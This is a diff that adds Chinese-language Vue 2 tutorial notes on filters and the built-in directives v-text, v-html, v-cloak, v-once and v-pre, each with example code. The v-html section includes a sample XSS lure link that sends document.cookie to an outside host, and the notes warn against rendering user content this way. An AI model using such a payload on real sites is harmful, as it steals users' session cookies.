@@ -2302,3 +2302,279 @@ Vue监视数据的原理：
 >
 > 例：`v-model.number=“phone” `就算是number类型的input框，`vue`收集的还是字符串，可以使用这个修饰符
 
+
+#### 1.16 过滤器
+
+**库推荐**
+
+> boocdn.cn  
+>
+> * moment.js
+> * dayjs
+
+1. 定义：对要显示的数据进行`特定格式化`后再显示（适用于一些【简单逻辑】的处理）。
+2. 语法：
+   * 1.注册过滤器：`Vue.filter(name,callback)` 或 `new Vue{filters:{}}`
+   * 2.使用过滤器：`{{ xxx | 过滤器名}}`  或 ` v-bind:属性 = "xxx | 过滤器名"`
+3. 备注：
+   * 1.过滤器也可以接收【额外参数】、多个过滤器也可以【串联】
+   * 2.并没有改变原本的数据, 是产生新的对应的数据
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <script src="../js/vue.js"></script>
+    <script src="../js/dayjs.js"></script>
+  </head>
+  <body>
+    <!-- 准备好一个容器 -->
+    <div id="root">
+      <h2>显示后的时间</h2>
+      <!-- 计算属性实现 -->
+      <h3>现在是：{{fmtTime}}</h3>
+      <!-- methods实现 -->
+      <h3>现在是：{{getFmtTime()}}</h3>
+      <!-- 过滤器实现    -->
+      <h3>现在是：{{time | timeFormater}}</h3>
+      <!-- 过滤器实现(传参)    -->
+      <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
+      <!-- 动态属性v-bind -->
+      <h3 :x="msg | mySplice"></h3>
+    </div>
+    <div id="root2">{{msg | mySlice}}</div>
+  </body>
+  <script>
+    Vue.config.productionTip = false //阻止vue在启动时生成生产提示
+    // 全局过滤器filter
+    Vue.filter('mySlice', function (value) {
+      return value.slice(0, 5) //截取前五位
+    })
+    new Vue({
+      el: '#root',
+      data: {
+        time: 1672834919884, //时间戳
+        msg: '你好,尚硅谷',
+      },
+      computed: {
+        fmtTime() {
+          return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss') //传以传的参为主，不传以当前为主
+        },
+      },
+      methods: {
+        getFmtTime() {
+          return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
+        },
+      },
+      // 局部过滤器filters
+      filters: {
+        // 过滤器的返回值会显示在{{time | timeFormater}}
+        timeFormater(value, str = 'YYYY年MM月DD日 HH:mm:ss') {
+          // console.log('@', value)
+          return dayjs(value).format(str)
+        },
+      },
+    })
+    new Vue({
+      el: '#root2',
+      data: {
+        msg: 'asdfghjjk',
+      },
+    })
+  </script>
+</html>
+```
+
+
+
+#### 1.17 vue内置指令
+
+**之前学过的指令：**
+
+- `v-bind` :单向绑定解析表达式，可简写为 :xxx
+- `v-model`: 双向数据绑定
+- `v-for` :遍历数组 / 对象 / 字符串
+- `v-on` :绑定事件监听，可简写为**@**
+- `v-show` :条件渲染 (动态控制节点是否展示)
+- `v-if` :条件渲染（动态控制节点是否存存在）
+- `v-else-if` :条件渲染（动态控制节点是否存存在）
+- `v-else` :条件渲染（动态控制节点是否存存在）
+
+##### 1.17.1 v-text指令
+
+1. 作用：向其所在的节点中渲染【文本内容】。
+2. 与插值语法的区别：[v-text](https://so.csdn.net/so/search?q=v-text&spm=1001.2101.3001.7020)【会替换】掉节点中的内容，`{{xx}}` 【则不会】。
+
+```html
+<body>
+    <!-- 准备好一个容器 -->
+    <div id="root">
+      <div>你好,{{name}}</div>
+      <!-- v-text会用name的值替换整个结构,把所有的值当文本解析,不会当成标签 -->
+      <div v-text="name">你好</div>
+      <div v-text="str"></div>
+    </div>
+  </body>
+  <script>
+    Vue.config.productionTip = false //阻止vue在启动时生成生产提示
+    new Vue({
+      el: '#root',
+      data: {
+        name: '尚硅谷',
+        str: '<h3>你好</h3>',
+      },
+    })
+  </script>
+```
+
+##### 1.17.2 v-html指令
+
+**cookie简略图示**
+
+![67283888845](https://github.com/yang061/Vue/blob/main/readmeImages/vue2/cookie%E7%AE%80%E7%95%A5%E5%9B%BE%E7%A4%BA1)
+
+> 每个浏览器的cookie是浏览器特有的，不能跨浏览器读取
+>
+> cookie是浏览器存在硬盘里的，关闭浏览器不会消失
+
+1. 作用：向指定节点中渲染包含【html结构】的内容。
+
+2. 与插值语法的区别：
+
+   * `v-html`会替换掉节点中所有的内容，`{{xx}}`则不会。
+
+
+   * `v-html`可以识别html结构。
+
+3.严重注意：`v-html`有安全性问题！！！！
+
+   * 在网站上动态渲染任意HTML是非常危险的，容易导致`XSS攻击`。
+   * 一定要在可信的内容上使用`v-html`，永远【不要用在】用户提交的内容上！
+
+```html
+  <body>
+    <!-- 准备好一个容器 -->
+    <div id="root">
+      <div>你好,{{name}}</div>
+      <div v-html="str"></div>
+      <div v-html="str2"></div>
+    </div>
+  </body>
+  <script>
+    Vue.config.productionTip = false //阻止vue在启动时生成生产提示
+    new Vue({
+      el: '#root',
+      data: {
+        name: '尚硅谷',
+        str: '<h3>你好</h3>',
+        str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
+      },
+    })
+  </script>
+```
+
+##### 1.17.3 v-vloak
+
+**v-cloak指令（没有值）：**
+
+- 本质是一个特殊属性，`Vue`实例创建完毕并接管容器后，会删掉`v-cloak`属性。
+- 使用`css`配合`v-cloak`可以解决网速慢时页面展示出`{{xxx}}`的问题。
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <style>
+      [v-cloak] {
+        display: none;
+      }
+    </style>
+    <script src="../js/vue.js"></script>
+  </head>
+  <body>
+    <!-- 准备好一个容器-->
+    <div id="root">
+      <h2 v-cloak>{{name}}</h2>
+    </div>
+    <script
+      type="text/javascript"
+      src="http://localhost:8080/resource/5s/vue.js"
+    ></script>
+
+    <script type="text/javascript">
+      console.log(1)
+      Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+
+      new Vue({
+        el: '#root',
+        data: {
+          name: '尚硅谷',
+        },
+      })
+    </script>
+  </body>
+</html>
+```
+
+##### 1.17.4 v-once指令
+
+**v-once指令：**
+
+- `v-once`所在节点在【初次动态渲染】后，就视为静态内容了。
+- 以后数据的改变不会引起`v-once`所在结构的更新，可以用于【优化性能】。
+
+```html
+<body>
+    <!-- 准备好一个容器 -->
+    <div id="root">
+      <h2 v-once>初始化的n值:{{n}}</h2>
+      <h2>当前的n值:{{n}}</h2>
+      <button @click="n++">点我n++</button>
+    </div>
+  </body>
+  <script>
+    Vue.config.productionTip = false //阻止vue在启动时生成生产提示
+    new Vue({
+      el: '#root',
+      data: {
+        n: 0,
+      },
+    })
+  </script>
+```
+
+##### 1.17.5 v-pre指令
+
+**v-pre指令：**
+
+- 【跳过】其所在节点的编译过程，不去解析
+- 可利用它跳过：【没有使用指令语法】、【没有使用插值语法的节点】，【会加快编译】
+
+```html
+<body>
+    <!-- 准备好一个容器 -->
+    <div id="root">
+      <h2 v-pre>vue很简单</h2>
+      <h2 v-pre>当前的n值:{{n}}</h2>
+      <button v-pre @click="n++">点我n++</button>
+    </div>
+  </body>
+  <script>
+    Vue.config.productionTip = false //阻止vue在启动时生成生产提示
+    new Vue({
+      el: '#root',
+      data: {
+        n: 0,
+      },
+    })
+  </script>
+```
+
